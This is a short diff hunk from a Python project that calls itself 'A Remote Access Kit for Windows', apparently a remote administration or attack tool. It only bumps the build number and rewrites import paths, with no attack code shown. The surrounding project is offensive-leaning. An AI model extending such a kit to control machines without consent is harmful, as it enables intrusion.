@@ -10,13 +10,12 @@
 #             [A Remote Access Kit for Windows]
 # Author: SlizBinksman
 # Github: https://github.com/slizbinksman
-# Build:  1.0.2
+# Build:  1.0.21
 # -------------------------------------------------------------
-from ..networking.socket import ServerSocket
-from ..networking.receiver_socket import ReceiverSocket
-from ..threading.threads import MultiThreading
-from ..client_handling.flags import ClientActionFlags
-from ..logging.logging import ConsoleWindow
+from core.networking.sockets.server_socket import ServerSocket
+from core.networking.sockets.receiver_socket import ReceiverSocket
+from core.threading.threads import MultiThreading
+from core.client_handling.flags import ClientActionFlags
 
 class SystemCommands:
 
